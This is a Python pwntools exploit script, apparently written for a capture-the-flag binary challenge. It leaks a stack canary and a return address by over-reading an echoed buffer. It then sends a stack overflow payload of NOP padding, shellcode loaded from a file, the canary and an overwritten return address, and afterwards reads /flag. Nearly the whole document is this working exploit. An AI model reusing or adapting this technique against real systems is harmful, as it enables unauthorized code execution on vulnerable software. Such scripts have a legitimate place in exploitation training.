#!/usr/bin/python3
from pwn import *
from sys import exit

context.binary = binary = ELF("", checksec=False)
context.log_level = "critical"
bp = ""
pack = make_packer("all")

_gdb = '''
set disassembly-flavor intel
break _exit
break read
c
display/8i $rip
display/x $rbp
display/x $rax
display/22g $rsp
'''

def exploit(p, return_address, canary):
    with open("asm/chmodtext", "rb") as f:
        shellcode = f.read()
        f.close()
    shellcode = bytes(shellcode)
    shellcode = bytes.fromhex("90" * (int("0x38", 16) - len(shellcode))) + shellcode
    shellcode += pack(0x27100c29bdeee93d)
    shellcode += bytes.fromhex("41" * 8) + pack(int(canary,16))
    shellcode += bytes.fromhex("00" * 8) + p64(int(return_address, 16) - 0x1b0) #11b0 10f0
    size = bytes(str(int(len(shellcode))),encoding="utf-8")
    print("[++] sz:", hex(int(size.decode())))

    p.recv()
    p.sendline(size)
    p.recv()
    p.sendline(shellcode)
    print(p.recvuntil(b"You said: ").decode())
    print("[++] Shellcode should be executed..")
    print(p.recv())
    try:
        with open("/flag", "r") as flag:
            print(flag.read())
            flag.close()
    except:
        print("[!!] Failed to read flag :(")

def parse_return(p, canary):
    shellcode = pack(int.from_bytes(b"REPEAT", byteorder="little"))
    shellcode += bytes.fromhex("41" * (int("0x50", 16) - len(shellcode)))
    size = bytes(str(int(len(shellcode))),encoding="utf-8")
    p.recv()
    p.sendline(size)
    p.recv()
    p.sendline(shellcode)
    return_address = hex(int.from_bytes(p.recvline_regex(b"You said: ").split(b": ")[-1][int(len(shellcode)):], byteorder="little"))
    if len(return_address[2:]) < 10:
        print("[!!] Failed to find return address..")
        p.close()
        p.kill()
        runner()
    print(f"[!!] Found return address: {return_address}")
    exploit(p, return_address, canary)

def parse_canary(p):
    shellcode = pack(int.from_bytes(b"REPEAT", byteorder="little"))
    shellcode += bytes.fromhex("41" * (int("0x49", 16) - len(shellcode)))
    size = bytes(str(int(len(shellcode))),encoding="utf-8")
    p.recv()
    p.sendline(size)
    p.recv()
    p.sendline(shellcode)
    canary = hex(int.from_bytes(p.recvline_regex(b"You said: ").split(b": ")[-1][int(len(shellcode)):], byteorder="little")) + "00"
    if len(canary[2:]) > 16:
        print(f"[!!] Large number returned \"{canary}\", {len(canary)-2} bytes.. parsing canary")
        canary = canary[-16:]
        canary = "0x" + canary
        print(f"[>>] Canary: {canary}\n[+>] {len(canary)-2} bytes")
        parse_return(p, canary)
    elif len(canary[2:]) < 24 or len(canary[2:]) < 16:
        print("[!!] No values found! found :(")
        p.close()
        p.kill()
        runner()

def runner():
    p = process()
    #p = gdb.debug(bp, gdbscript=_gdb, terminal=["tmux", "splitw", "-h"])
    parse_canary(p)

runner()
